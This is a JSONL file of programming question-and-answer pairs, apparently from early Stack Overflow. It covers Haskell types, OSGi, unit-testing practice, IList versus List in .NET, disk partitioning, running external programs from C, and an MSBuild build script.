{"instruction": "I have a project group that contains a project I'm working on as well as some related component and packages. I prefer to keep the database links active during design-time. \nI know how to write the code which would change the database file location, but in this case, I'm just using \".\\data\" instead, for various design-time reasons. Unfortunately, using a relative folder means that Delphi needs to be \"pointing\" to the same folder that the project is in.\nI'd like to be able to force the folder location to a different root, without using the \"Save As\" feature. Does anyone happen to know where the Delphi IDE retrieves that info?", "output": "I am not sure I completely understand your question.\n\nIf you are referring to the folder the IDE has as the current folder, then you can just change the shortcut that launches Delphi to set the current directory where ever you want it to be."}
{"instruction": "What's the best way to handle translations for stock text in a SSRS. For instance - if I have a report that shows a grid of contents what's the best way to have the correct translation for the header of that grid show up, assuming the culture of the report is set correctly.\nPut another way - is it possible to do resources in a SSRS report, or am I stuck with storing all that text in the database and querying for it?", "output": "AS far as I know, there is no way to localize a report (meaning automating the translation of string litterals)...\nLike you said,you basically have to use the User!Language global variable to catch the user's settings and then use that to retrieve the appropriate strings from the DB...\nHowever, you can adapt the display of currency/numeric/date fields according to the user locale. Also possible is changing the interface of the Report Viewer to match your user's langage.\nHere are a few links giving tips on how to adapt the locale:\nhttp://www.ssw.com.au/Ssw/Standards/Rules/RulesToBetterSQLReportingServices.aspx#LanguageSetting\nLangage pack for Report Viewer:\nhttp://www.microsoft.com/downloads/details.aspx?displaylang=en&FamilyID=e3d3071b-d919-4ff9-9696-c11d312a36a0"}
{"instruction": "I'm trying to fully understand all of Haskell's concepts.\nIn what ways are algebraic data types similar to generic types, e.g., in C# and Java? And how are they different? What's so algebraic about them anyway? \nI'm familiar with universal algebra and its rings and fields, but I only have a vague idea of how Haskell's types work.", "output": "\"Algebraic Data Types\" in Haskell support full parametric polymorphism, which is the more technically correct name for generics, as a simple example the list data type:\n data List a = Cons a (List a) | Nil\n\nIs equivalent (as much as is possible, and ignoring non-strict evaluation, etc) to\n class List<a> {\n     class Cons : List<a> {\n         a head;\n         List<a> tail;\n     }\n     class Nil : List<a> {}\n }\n\nOf course Haskell's type system allows more ... interesting use of type parameters but this is just a simple example.  With regards to the \"Algebraic Type\" name, i've honestly never been entirely sure of the exact reason for them being named that, but have assumed that it's due the mathematical underpinnings of the type system.  I believe that the reason boils down to the theoretical definition of an ADT being the \"product of a set of constructors\", however it's been a couple of years since i escaped university so i can no longer remember the specifics.\n[Edit: Thanks to Chris Conway for pointing out my foolish error, ADT are of course sum types, the constructors providing the product/tuple of fields]"}
{"instruction": "What makes a module/service/bit of application functionality a particularly good candidate for an OSGi module? \nI'm interested in using OSGi in my applications. We're a Java shop and we use Spring pretty extensively, so I'm leaning toward using Spring Dynamic Modules for OSGi(tm) Service Platforms. I'm looking for a good way to incorporate a little bit of OSGi into an application as a trial. Has anyone here used this or a similar OSGi technology? Are there any pitfalls? \n@Nicolas - Thanks, I've seen that one. It's a good tutorial, but I'm looking more for ideas on how to do my first \"real\" OSGi bundle, as opposed to a Hello World example.\n@david - Thanks for the link! Ideally, with a greenfield app, I'd design the whole thing to be dynamic. What I'm looking for right now, though, is to introduce it in a small piece of an existing application. Assuming I can pick any piece of the app, what are some factors to consider that would make that piece better or worse as an OSGi guinea pig?", "output": "Well, since you can not have one part OSGi and one part non-OSGi you'll need to make your entire app OSGi. In its simplest form you make a single OSGi bundle out of your entire application. Clearly this is not a best practice but it can be useful to get a feel for deploying a bundle in an OSGi container (Equinox, Felix, Knoplerfish, etc).\nTo take it to the next level you'll want to start splitting your app into components, components should typically have a set of responsibilities that can be isolated from the rest of your application through a set of interfaces and class dependencies. Identifying these purely by hand can range from rather straightforward for a well designed highly cohesive but loosely coupled application to a nightmare for interlocked source code that you are not familiar with.\nSome help can come from tools like JDepend which can show you the coupling of Java packages against other packages/classes in your system. A package with low efferent coupling should be easier to extract into an OSGi bundle than one with high efferent coupling. Even more architectural insight can be had with pro tools like Structure 101.\nPurely on a technical level, working daily with an application that consists of 160 OSGi bundles and using Spring DM I can confirm that the transition from \"normal\" Spring to Spring DM is largely pain free. The extra namespace and the fact that you can (and should) isolate your OSGi specific Spring configuration in separate files makes it even easier to have both with and without OSGi deployment scenarios.\nOSGi is a deep and wide component model, documentation I recommend:\n\nOSGi R4 Specification: Get the PDFs of the Core and Compendium specification, they are canonical, authoritative and very readable. Have a shortcut to them handy at all times, you will consult them.\nRead up on OSGi best practices, there is a large set of things you can do but a somewhat smaller set of things you should do and there are some things you should never do (DynamicImport: * for example). \n\nSome links: \n\nOSGi best practices and using Apache Felix\nPeter Kriens and BJ Hargrave in a Sun presentation on OSGi best practices \none key OSGi concept are Services, learn why and how they supplant the Listener pattern with the Whiteboard pattern\nThe Spring DM Google Group is very responsive and friendly in my experience\nThe Spring DM Google Group is no longer active and has moved to Eclipse.org as the Gemini Blueprint project which has a forum here."}
{"instruction": "I'm trying to fully understand all of Haskell's concepts.\nIn what ways are algebraic data types similar to generic types, e.g., in C# and Java? And how are they different? What's so algebraic about them anyway? \nI'm familiar with universal algebra and its rings and fields, but I only have a vague idea of how Haskell's types work.", "output": "For me, the concept of Haskell's algebraic data types always looked like polymorphism in OO-languages like C#.\nLook at the example from http://en.wikipedia.org/wiki/Algebraic_data_types:\ndata Tree = Empty \n          | Leaf Int \n          | Node Tree Tree\n\nThis could be implemented in C# as a TreeNode base class, with a derived Leaf class and a derived TreeNodeWithChildren class, and if you want even a derived EmptyNode class.\n(OK I know, nobody would ever do that, but at least you could do it.)"}
{"instruction": "Unit testing is, roughly speaking, testing bits of your code in isolation with test code. The immediate advantages that come to mind are:\n\nRunning the tests becomes automate-able and repeatable\nYou can test at a much more granular level than point-and-click testing via a GUI\n\nRytmis\n\nMy question is, what are the current \"best practices\" in terms of tools as well as when and where to use unit testing as part of your daily coding?\nLets try to be somewhat language agnostic and cover all the bases.", "output": "The xUnit family are the mainstay of unit testing. They are integrated into the likes of Netbeans, Eclipse and many other IDEs. They offer a simple, structured solution to unit testing.\nOne thing I always try and do when writing a test is to minimise external code usage. By that I mean: I try to minimise the setup and teardown code for the test as much as possible and try to avoid using other modules/code blocks as much as possible. Well-written modular code shouldn't require too much external code in it's setup and teardown."}
{"instruction": "Unit testing is, roughly speaking, testing bits of your code in isolation with test code. The immediate advantages that come to mind are:\n\nRunning the tests becomes automate-able and repeatable\nYou can test at a much more granular level than point-and-click testing via a GUI\n\nRytmis\n\nMy question is, what are the current \"best practices\" in terms of tools as well as when and where to use unit testing as part of your daily coding?\nLets try to be somewhat language agnostic and cover all the bases.", "output": "The so-called xUnit framework is widely used. It was originally developed for Smalltalk as SUnit, evolved into JUnit for Java, and now has many other implementations such as NUnit for .Net. It's almost a de facto standard - if you say you're using unit tests, a majority of other developers will assume you mean xUnit or similar."}
{"instruction": "Unit testing is, roughly speaking, testing bits of your code in isolation with test code. The immediate advantages that come to mind are:\n\nRunning the tests becomes automate-able and repeatable\nYou can test at a much more granular level than point-and-click testing via a GUI\n\nRytmis\n\nMy question is, what are the current \"best practices\" in terms of tools as well as when and where to use unit testing as part of your daily coding?\nLets try to be somewhat language agnostic and cover all the bases.", "output": "A great resource for 'best practices' is the Google Testing Blog, for example a recent post on Writing Testable Code is a fantastic resource. Specifically their 'Testing on the Toilet' series weekly posts are great for posting around your cube, or toilet, so you can always be thinking about testing."}
{"instruction": "Unit testing is, roughly speaking, testing bits of your code in isolation with test code. The immediate advantages that come to mind are:\n\nRunning the tests becomes automate-able and repeatable\nYou can test at a much more granular level than point-and-click testing via a GUI\n\nRytmis\n\nMy question is, what are the current \"best practices\" in terms of tools as well as when and where to use unit testing as part of your daily coding?\nLets try to be somewhat language agnostic and cover all the bases.", "output": "Ok here's some best practices from some one who doesn't unit test as much as he should...cough.\n\nMake sure your tests test one\nthing and one thing only.\nWrite unit tests as you go. Preferably before you write the code you are testing against.\nDo not unit test the GUI. \nSeparate your concerns. \nMinimise the dependencies of your tests.\nMock behviour with mocks."}
{"instruction": "Unit testing is, roughly speaking, testing bits of your code in isolation with test code. The immediate advantages that come to mind are:\n\nRunning the tests becomes automate-able and repeatable\nYou can test at a much more granular level than point-and-click testing via a GUI\n\nRytmis\n\nMy question is, what are the current \"best practices\" in terms of tools as well as when and where to use unit testing as part of your daily coding?\nLets try to be somewhat language agnostic and cover all the bases.", "output": "NUnit is a good tool for any of the .NET languages.\nUnit tests can be used in a number of ways: \n\nTest Logic\nIncrease separation of code units.  If you can't fully test a function or section of code, then the parts that make it up are too interdependant.\nDrive development, some people write tests before they write the code to be tested.  This forces you to think about what you want the code to do, and then gives you a definite guideline on when you have acheived that."}
{"instruction": "I need to read from Outlook .MSG file in .NET without using COM API for Outlook (cos it will not be installed on the machines that my app will run). Are there any free 3rd party libraries to do that? I want to extract From, To, CC and BCC fields. Sent/Receive date fields would be good if they are also stored in MSG files.", "output": "Microsoft has documented this: .MSG File Format Specification"}
{"instruction": "I'm trying to fully understand all of Haskell's concepts.\nIn what ways are algebraic data types similar to generic types, e.g., in C# and Java? And how are they different? What's so algebraic about them anyway? \nI'm familiar with universal algebra and its rings and fields, but I only have a vague idea of how Haskell's types work.", "output": "Haskell's datatypes are called \"algebraic\" because of their connection to categorical initial algebras. But that way lies madness.\n@olliej: ADTs are actually \"sum\" types. Tuples are products."}
{"instruction": "What are some standard practices for managing a medium-large JavaScript application? My concerns are both speed for browser download and ease and maintainability of development.\nOur JavaScript code is roughly \"namespaced\" as:\nvar Client = {\n   var1: '',\n   var2: '',\n\n   accounts: {\n      /* 100's of functions and variables */\n   },\n\n   orders: {\n      /* 100's of functions and variables and subsections */\n   }\n\n   /* etc, etc  for a couple hundred kb */\n}\n\nAt the moment, we have one (unpacked, unstripped, highly readable) JavaScript file to handle all the business logic on the web application. In addition, there is jQuery and several jQuery extensions. The problem we face is that it takes forever to find anything in the JavaScript code and the browser still has a dozen files to download.\nIs it common to have a handful of \"source\" JavaScript files that gets \"compiled\" into one final, compressed JavaScript file? Any other handy hints or best practices?", "output": "There's an excellent article on Vitamin by Cal Henderson of Flickr fame on how they optimise delivery of their CSS and JavaScript: http://www.iamcal.com/serving-javascript-fast/"}
{"instruction": "Admittedly this might not be a problem on larger screens, but my employer is abit tight and refuses to buy monitors larger than 19inch, this means that I dont have much screen real estate to view all the Visual Studio windows and my code at the same time, or two pieces of code at once. Is there anything that allows me to detach the code panels so that I can view two different classes at once on each of my screens?", "output": "You can right click on the tab strip and insert a new vertical (or horizontal) tab group.\nThis allows you to view multiple tabs at the same time."}
{"instruction": "Admittedly this might not be a problem on larger screens, but my employer is abit tight and refuses to buy monitors larger than 19inch, this means that I dont have much screen real estate to view all the Visual Studio windows and my code at the same time, or two pieces of code at once. Is there anything that allows me to detach the code panels so that I can view two different classes at once on each of my screens?", "output": "Hmm.. I don't think there is a way from within Visual Studio. For maximizing real estate and working on simultaneous files, I use that method plus viewing the files on Full Screen mode.\nDo you multiple monitors?"}
{"instruction": "Admittedly this might not be a problem on larger screens, but my employer is abit tight and refuses to buy monitors larger than 19inch, this means that I dont have much screen real estate to view all the Visual Studio windows and my code at the same time, or two pieces of code at once. Is there anything that allows me to detach the code panels so that I can view two different classes at once on each of my screens?", "output": "You could stretch visual studio across both monitors then put two code windows next to each other.\nBasically, you are manually maximizing VS across both screens."}
{"instruction": "What are some standard practices for managing a medium-large JavaScript application? My concerns are both speed for browser download and ease and maintainability of development.\nOur JavaScript code is roughly \"namespaced\" as:\nvar Client = {\n   var1: '',\n   var2: '',\n\n   accounts: {\n      /* 100's of functions and variables */\n   },\n\n   orders: {\n      /* 100's of functions and variables and subsections */\n   }\n\n   /* etc, etc  for a couple hundred kb */\n}\n\nAt the moment, we have one (unpacked, unstripped, highly readable) JavaScript file to handle all the business logic on the web application. In addition, there is jQuery and several jQuery extensions. The problem we face is that it takes forever to find anything in the JavaScript code and the browser still has a dozen files to download.\nIs it common to have a handful of \"source\" JavaScript files that gets \"compiled\" into one final, compressed JavaScript file? Any other handy hints or best practices?", "output": "In our big javascript applications, we write all our code in small separate files - one file per 'class' or functional group, using a kind-of-like-Java namespacing/directory structure. We then have:\n\nA compile-time step that takes all our code and minifies it (using a variant of JSMin) to reduce download size\nA compile-time step that takes the classes that are always or almost always needed and concatenates them into a large bundle to reduce round trips to the server\nA 'classloader' that loads the remaining classes at runtime on demand."}
{"instruction": "I've got some Japanese in the ALT attribute, but the tooltip is showing me the ugly block characters in the tooltip.  The rest of the content on the page renders correctly.  So far, it seems to be limited to the tooltips.", "output": "Do note that the alt attribute isn't intended to be a tooltip. Alt is for describing the image where the image itself is not available. If you want to use tooltips, use the title attribute instead."}
{"instruction": "Admittedly this might not be a problem on larger screens, but my employer is abit tight and refuses to buy monitors larger than 19inch, this means that I dont have much screen real estate to view all the Visual Studio windows and my code at the same time, or two pieces of code at once. Is there anything that allows me to detach the code panels so that I can view two different classes at once on each of my screens?", "output": "Tools>Options>General>Multiple Documents"}
{"instruction": "Admittedly this might not be a problem on larger screens, but my employer is abit tight and refuses to buy monitors larger than 19inch, this means that I dont have much screen real estate to view all the Visual Studio windows and my code at the same time, or two pieces of code at once. Is there anything that allows me to detach the code panels so that I can view two different classes at once on each of my screens?", "output": "If you don't need to compile one of the code screens, have you thought about just opening Notepad++ or PSPad in your other monitor and viewing the second batch of code that way? They have context sensitive coloring that would assist in reading. I do this all the time."}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "I found very insightful ideas about starting a new large project, based on\n\ncommon good practices\nTest Driven Development\nand pragmatic approach  \n\nin the book Growing Object-Oriented Software, Guided by Tests.\nIt is still under development, but first 3 chapters may be what You are looking for and IMHO worth reading."}
{"instruction": "We have a question with regards to XML-sig and need detail about the optional elements as well as some of the canonicalization and transform stuff.  We're writing a spec for a very small XML-syntax payload that will go into the metadata of media files and it needs to by cryptographically signed.  Rather than re-invent the wheel, We thought we should use the XML-sig spec but I think most of it is overkill for what we need, and so we like to have more information/dialogue with people who know the details.\nSpecifically, do we need to care about either transforms or canonicalization if the XML is very basic with no tabs for formatting and is specific to our needs?", "output": "If the option exists to not do an XML signature and instead just to treat the XML as a byte stream and to sign that, do it. It will be easier to implement, easier to understand, more stable (no canonicalization, transform, policy, ...) and faster. \nIf you absolutely must have XML DSIG (sadly, some of us must), it is certainly possible these days but there are many, many caveats. You need good library support, with Java this is out of the box in JDK 1.6, I am not familiar with other platforms. You must test interoperability with the receiving end of your signed XML, especially if they are potentially on a different platform.\nBe sure to read Why XML Security Is Broken, it basically covers all the ground regarding the horror that is XML Canonicalization and gives some pointers to some alternatives."}
{"instruction": "I'd like to make a debug logging function with the same parameters as printf.  But one that can be removed by the pre-processor during optimized builds.\nFor example:\nDebug_Print(\"Warning: value %d > 3!\\n\", value);\n\nI've looked at variadic macros but those aren't available on all platforms. gcc supports them, msvc does not.", "output": "Another fun way to stub out variadic functions is:\n#define function sizeof"}
{"instruction": "I have a new 1 TB drive coming in tomorrow. What is the best way to divide this space for a development workstation?\nThe biggest problem I think I'm going to have is that some partitions (probably /usr) will become to small after a bit of use. Other partitions are probably to huge. The swap drive for example is currently 2GB (2x 1GB RAM), but it is almost never used (only once that I know of).", "output": "If you partition your drive using LVM you won't have to worry about any individual partition running out of space in the future. Just move space around as necessary."}
{"instruction": "I have a new 1 TB drive coming in tomorrow. What is the best way to divide this space for a development workstation?\nThe biggest problem I think I'm going to have is that some partitions (probably /usr) will become to small after a bit of use. Other partitions are probably to huge. The swap drive for example is currently 2GB (2x 1GB RAM), but it is almost never used (only once that I know of).", "output": "If you want a classic setup, I'd go for a 50GB \"/\" partition, for all your application goodness, and split the rest across users, or a full 950GB for a single user. Endless diskspace galore!"}
{"instruction": "What makes a module/service/bit of application functionality a particularly good candidate for an OSGi module? \nI'm interested in using OSGi in my applications. We're a Java shop and we use Spring pretty extensively, so I'm leaning toward using Spring Dynamic Modules for OSGi(tm) Service Platforms. I'm looking for a good way to incorporate a little bit of OSGi into an application as a trial. Has anyone here used this or a similar OSGi technology? Are there any pitfalls? \n@Nicolas - Thanks, I've seen that one. It's a good tutorial, but I'm looking more for ideas on how to do my first \"real\" OSGi bundle, as opposed to a Hello World example.\n@david - Thanks for the link! Ideally, with a greenfield app, I'd design the whole thing to be dynamic. What I'm looking for right now, though, is to introduce it in a small piece of an existing application. Assuming I can pick any piece of the app, what are some factors to consider that would make that piece better or worse as an OSGi guinea pig?", "output": "Is your existing application monolithic or tiered in seperate processes/layers?\nIf tiered, you can convert the middle/app-tier to run in an OSGi container.\nIn my team's experience, we've found trying to do web-stuff in OSGi painful.  Other pain points are Hibernate and Jakarta Commons Logging.\nI find the OSGi specs pretty readable and I recommend you print out the flowchart that shows the algorithm for class loading.  I'll guarantee you'll have moments of, \"why am I getting a NoClassDefFoundError?\": the flowchart will tell you why."}
{"instruction": "I have a new 1 TB drive coming in tomorrow. What is the best way to divide this space for a development workstation?\nThe biggest problem I think I'm going to have is that some partitions (probably /usr) will become to small after a bit of use. Other partitions are probably to huge. The swap drive for example is currently 2GB (2x 1GB RAM), but it is almost never used (only once that I know of).", "output": "My standard strategy for normal \"utility\" boxes is to give them a swap partition twice the size of their RAM, a 1GB /boot partition and leave the rest as one vast partition.  Whilst I see why some people want a separate /var, separate /home, etc., if I only have trusted users and I'm not running some production service, I don't think the reasons I've heard to date apply.  Instead, I do my best to avoid any resizing, or any partition becoming too small - which is best achieved with one huge partition.\nAs for the size of swap and /boot - if your machine has 4GB memory, you may not want to have double that in swap.  It's nonetheless wise to at least have some.  Even if you nonetheless have double, you're using a total of 9GB, for 0.9% of your new drive.  /boot can be smaller than 1GB, this is just my standard \"will not become full, ever\" size."}
{"instruction": "Unit testing is, roughly speaking, testing bits of your code in isolation with test code. The immediate advantages that come to mind are:\n\nRunning the tests becomes automate-able and repeatable\nYou can test at a much more granular level than point-and-click testing via a GUI\n\nRytmis\n\nMy question is, what are the current \"best practices\" in terms of tools as well as when and where to use unit testing as part of your daily coding?\nLets try to be somewhat language agnostic and cover all the bases.", "output": "You might want to look at TDD on Three Index Cards and Three Index Cards to Easily Remember the Essence of Test-Driven Development:\nCard #1. Uncle Bob\u2019s Three Laws\n\nWrite no production code except to pass a failing test.\nWrite only enough of a test to demonstrate a failure.\nWrite only enough production code to pass the test.\n\nCard #2: FIRST Principles\n\nFast: Mind-numbingly fast, as in hundreds or thousands per second.\nIsolated: The test isolates a fault clearly.\nRepeatable: I can run it repeatedly and it will pass or fail the same way each time.\nSelf-verifying: The Test is unambiguously pass-fail.\nTimely: Produced in lockstep with tiny code changes.\n\nCard #3: Core of TDD\n\nRed: test fails\nGreen: test passes\nRefactor: clean code and tests"}
{"instruction": "How do you run an external program and pass it command line parameters using C? If you have to use operating system API, include a solution for Windows, Mac, and Linux.", "output": "#include <stdlib.h>\n\nint main()\n{\n    system(\"echo HAI\");\n\n    return 0;\n}"}
{"instruction": "How do you run an external program and pass it command line parameters using C? If you have to use operating system API, include a solution for Windows, Mac, and Linux.", "output": "One solution is the system function defined in stdlib.h \nint system(const char *string);\n\nsystem api example"}
{"instruction": "I know that IList is the interface and List is the concrete type but I still don't know when to use each one. What I'm doing now is if I don't need the Sort or FindAll methods I use the interface. Am I right? Is there a better way to decide when to use the interface or the concrete type?", "output": "I don't think there are hard and fast rules for this type of thing, but I usually go by the guideline of using the lightest possible way until absolutely necessary.\nFor example, let's say you have a Person class and a Group class. A Group instance has many people, so a List here would make sense. When I declare the list object in Group I will use an IList<Person> and instantiate it as a List.\npublic class Group {\n  private IList<Person> people;\n\n  public Group() {\n    this.people = new List<Person>();\n  }\n}\n\nAnd, if you don't even need everything in IList you can always use IEnumerable too. With modern compilers and processors, I don't think there is really any speed difference, so this is more just a matter of style."}
{"instruction": "I know that IList is the interface and List is the concrete type but I still don't know when to use each one. What I'm doing now is if I don't need the Sort or FindAll methods I use the interface. Am I right? Is there a better way to decide when to use the interface or the concrete type?", "output": "In situations I usually come across, I rarely use IList directly.\nUsually I just use it as an argument to a method  \nvoid ProcessArrayData(IList almostAnyTypeOfArray)\n{\n    // Do some stuff with the IList array\n}\n\nThis will allow me to do generic processing on almost any array in the .NET framework, unless it uses IEnumerable and not IList, which happens sometimes.\nIt really comes down to the kind of functionality you need. I'd suggest using the List class in most cases. IList is best for when you need to make a custom array that could have some very specific rules that you'd like to encapsulate within a collection so you don't repeat yourself, but still want .NET to recognize it as a list."}
{"instruction": "I know that IList is the interface and List is the concrete type but I still don't know when to use each one. What I'm doing now is if I don't need the Sort or FindAll methods I use the interface. Am I right? Is there a better way to decide when to use the interface or the concrete type?", "output": "If you're working within a single method (or even in a single class or assembly in some cases) and no one outside is going to see what you're doing, use the fullness of a List. But if you're interacting with outside code, like when you're returning a list from a method, then you only want to declare the interface without necessarily tying yourself to a specific implementation, especially if you have no control over who compiles against your code afterward. If you started with a concrete type and you decided to change to another one, even if it uses the same interface, you're going to break someone else's code unless you started off with an interface or abstract base type."}
{"instruction": "I know that IList is the interface and List is the concrete type but I still don't know when to use each one. What I'm doing now is if I don't need the Sort or FindAll methods I use the interface. Am I right? Is there a better way to decide when to use the interface or the concrete type?", "output": "You should use the interface only if you need it, e.g., if your list is casted to an IList implementation other than List. This is true when, for example, you use NHibernate, which casts ILists into an NHibernate bag object when retrieving data.\nIf List is the only implementation that you will ever use for a certain collection, feel free to declare it as a concrete List implementation."}
{"instruction": "I know that IList is the interface and List is the concrete type but I still don't know when to use each one. What I'm doing now is if I don't need the Sort or FindAll methods I use the interface. Am I right? Is there a better way to decide when to use the interface or the concrete type?", "output": "It's always best to use the lowest base type possible. This gives the implementer of your interface, or consumer of your method, the opportunity to use whatever they like behind the scenes.\nFor collections you should aim to use IEnumerable where possible. This gives the most flexibility but is not always suited."}
{"instruction": "How do you run an external program and pass it command line parameters using C? If you have to use operating system API, include a solution for Windows, Mac, and Linux.", "output": "On UNIX, I think you basically need to fork it if you want the spawned process to run detached from your the spawing one : For instance if you don't want your spawned process to be terminate when you quit your spawning process.\nHere is a page that explains all the subtle differences between Fork, System, Exec.\nIf you work on Win,Mac and linux, I can recommend you the Qt Framework and its QProcess object, but I don't know if that's an option for you. The great advantages is that you will be able to compile the same code on windows linux and mac :\n QString program = \"./yourspawnedprogram\";\n QProcess * spawnedProcess = new QProcess(parent);\n spawnedProcess->start(program);\n // or spawnedProcess->startDetached(program);\n\nAnd for extra, you can even kill the child process from the mother process,\nand keep in communication with it through a stream."}
{"instruction": "I'm creating an ZIP file with ZipFile in Python 2.5, it works ok so far:\nimport zipfile, os\n\nlocfile = \"test.txt\"\nloczip = os.path.splitext (locfile)[0] + \".zip\"\nzip = zipfile.ZipFile (loczip, \"w\")\nzip.write (locfile)\nzip.close()\n\nbut I couldn't find how to encrypt the files in the ZIP file.\nI could use system and call PKZIP -s, but I suppose there must be a more \"Pythonic\" way.  I'm looking for an open source solution.", "output": "You can use the Chilkat library.  It's commercial, but has a free evaluation and seems pretty nice.\nHere's an example I got from here:\nimport chilkat\n\n# Demonstrates how to create a WinZip-compatible 128-bit AES strong encrypted zip\nzip = chilkat.CkZip()\nzip.UnlockComponent(\"anything for 30-day trial\")\n\nzip.NewZip(\"strongEncrypted.zip\")\n\n# Set the Encryption property = 4, which indicates WinZip compatible AES encryption.\nzip.put_Encryption(4)\n# The key length can be 128, 192, or 256.\nzip.put_EncryptKeyLength(128)\nzip.SetPassword(\"secret\")\n\nzip.AppendFiles(\"exampleData/*\",True)\nzip.WriteZip()"}
{"instruction": "I know that IList is the interface and List is the concrete type but I still don't know when to use each one. What I'm doing now is if I don't need the Sort or FindAll methods I use the interface. Am I right? Is there a better way to decide when to use the interface or the concrete type?", "output": "There are two rules I follow:\n\nAccept the most basic type that will work\nReturn the richest type your user will need\n\nSo when writing a function or method that takes a collection, write it not to take a List, but an IList<T>, an ICollection<T>, or IEnumerable<T>.  The generic interfaces will still work even for heterogenous lists because System.Object can be a T too.  Doing this will save you headache if you decide to use a Stack or some other data structure further down the road.  If all you need to do in the function is foreach through it, IEnumerable<T> is really all you should be asking for.\nOn the other hand, when returning an object out of a function, you want to give the user the richest possible set of operations without them having to cast around.  So in that case, if it's a List<T> internally, return a copy as a List<T>."}
{"instruction": "How do you run an external program and pass it command line parameters using C? If you have to use operating system API, include a solution for Windows, Mac, and Linux.", "output": "If you want to perform more complicated operations, like reading the output of the external program, you may be better served by the popen system call. For example, to programmatically access a directory listing (this is a somewhat silly example, but useful as an example), you could write something like this:\n#include <stdio.h>\n\nint main()\n{\n  int entry = 1;\n  char line[200];\n  FILE* output = popen(\"/usr/bin/ls -1 /usr/man\", \"r\");\n  while ( fgets(line, 199, output) )\n  {\n    printf(\"%5d: %s\", entry++, line);\n  }\n}\n\nto give output like this\n1: cat1\n2: cat1b\n3: cat1c\n4: cat1f\n5: cat1m\n6: cat1s\n..."}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "I use MSBuild completely for building.  Here's my generic MSBuild script that searches the tree for .csproj files and builds them:\n<Project xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\" DefaultTargets=\"Build\">\n  <UsingTask AssemblyFile=\"$(MSBuildProjectDirectory)\\bin\\xUnit\\xunitext.runner.msbuild.dll\" TaskName=\"XunitExt.Runner.MSBuild.xunit\"/>\n  <PropertyGroup>\n\t<Configuration Condition=\"'$(Configuration)'==''\">Debug</Configuration>\n    <DeployDir>$(MSBuildProjectDirectory)\\Build\\$(Configuration)</DeployDir>\n\t<ProjectMask>$(MSBuildProjectDirectory)\\**\\*.csproj</ProjectMask>\n\t<ProjectExcludeMask></ProjectExcludeMask>\n    <TestAssembliesIncludeMask>$(DeployDir)\\*.Test.dll</TestAssembliesIncludeMask>\n  </PropertyGroup>\n\n  <ItemGroup>\n    <ProjectFiles Include=\"$(ProjectMask)\" Exclude=\"$(ProjectExcludeMask)\"/>\n  </ItemGroup>\n\n  <Target Name=\"Build\" DependsOnTargets=\"__Compile;__Deploy;__Test\"/>\n\n  <Target Name=\"Clean\">\n    <MSBuild Projects=\"@(ProjectFiles)\" Targets=\"Clean\"/>\n    <RemoveDir Directories=\"$(DeployDir)\"/>\n  </Target>\n\n  <Target Name=\"Rebuild\" DependsOnTargets=\"Clean;Build\"/>\n\n  <!--\n  ===== Targets that are meant for use only by MSBuild =====\n  -->\n  <Target Name=\"__Compile\">\n    <MSBuild Projects=\"@(ProjectFiles)\" Targets=\"Build\">\n      <Output TaskParameter=\"TargetOutputs\" ItemName=\"AssembliesBuilt\"/>\n    </MSBuild>\n    <CreateItem Include=\"@(AssembliesBuilt -> '%(RootDir)%(Directory)*')\">\n      <Output TaskParameter=\"Include\" ItemName=\"DeployFiles\"/>\n    </CreateItem>\n  </Target>\n\n  <Target Name=\"__Deploy\">\n    <MakeDir Directories=\"$(DeployDir)\"/>\n    <Copy SourceFiles=\"@(DeployFiles)\" DestinationFolder=\"$(DeployDir)\"/>\n    <CreateItem Include=\"$(TestAssembliesIncludeMask)\">\n      <Output TaskParameter=\"Include\" ItemName=\"TestAssemblies\"/>\n    </CreateItem>\n  </Target>\n\n  <Target Name=\"__Test\">\n    <xunit Assembly=\"@(TestAssemblies)\"/>\n  </Target>\n</Project>\n\n(Sorry if it's a little dense.  Markdown seems to be stripping out the blank lines.)\nIt's pretty simple though once you understand the concepts and all the dependencies are handled automatically.  I should note that we use Visual Studio project files, which have a lot of logic built into them, but this system allows people to build almost identically both within the Visual Studio IDE or at the command line and still gives you the flexibility of adding things to the canonical build like the xUnit testing you see in the script above.\nThe one PropertyGroup is where all the configuration happens and things can be customized, like excluding certain projects from the build or adding new test assembly masks.\nThe ItemGroup is where the logic happens that finds all the .csproj files in the tree.\nThen there are the targets, which most people familiar with make, nAnt or MSBuild should be able to follow.  If you call the Build target, it calls _Compile, _Deploy and __Test.  The Clean target calls MSBuild on all the project files for them to clean up their directories and then the global deployment directory is deleted.  Rebuild calls Clean and then Build."}
{"instruction": "I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development. \nThis is a multi-part question really: \n\nWhat are the common specializations within computer programming and software development?  \nWhich of these specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? \nWhich skill sets complement each other? \nAre there any areas of specialization that hinder your ability of developing other areas of specialization.", "output": "Not to directly reject your premise but I actually think being a generalist is a good position in programming. You will certainly develop expertise in specific areas but it is likely to be a product of either personal interest or work necessity. Over time the stuff you are able to transfer across languages and problem domains is at the heart of what makes good programmers."}
{"instruction": "I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development. \nThis is a multi-part question really: \n\nWhat are the common specializations within computer programming and software development?  \nWhich of these specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? \nWhich skill sets complement each other? \nAre there any areas of specialization that hinder your ability of developing other areas of specialization.", "output": "I think the more important question is: What areas of specialization are you most interested in?\nOnce you know, begin learning in that area!"}
